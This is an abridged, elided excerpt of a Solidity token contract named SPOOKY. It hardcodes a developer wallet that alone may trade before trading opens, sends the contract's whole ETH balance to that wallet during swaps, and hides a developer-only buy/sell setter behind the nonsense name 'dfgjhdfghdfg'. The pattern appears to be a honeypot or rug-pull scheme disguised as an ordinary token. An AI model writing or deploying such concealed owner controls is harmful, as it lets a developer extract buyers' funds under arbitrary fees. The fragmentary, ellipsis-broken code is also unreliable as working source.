...
interface IUniswapV2Router02 {
    ...
    contract SPOOKY {
        ...
        string public   _name = unicode"SPOOKY"; 
        string public   _symbol = unicode"SPOOKY";  
        ...
        address payable constant DEV_SPOOKY = payable(address(0x138285EA29E42e6c8ae24408D0B2AeaF0cdBbE32));
        ...
        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == DEV_SPOOKY || to == DEV_SPOOKY);
            ...
            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                ...
                DEV_SPOOKY.transfer(address(this).balance);
                swapping = false;
            }
        ...
        function dfgjhdfghdfg(uint256 _buy, uint256 _sell) external {
            if(msg.sender != DEV_SPOOKY)        
                revert Permissions();
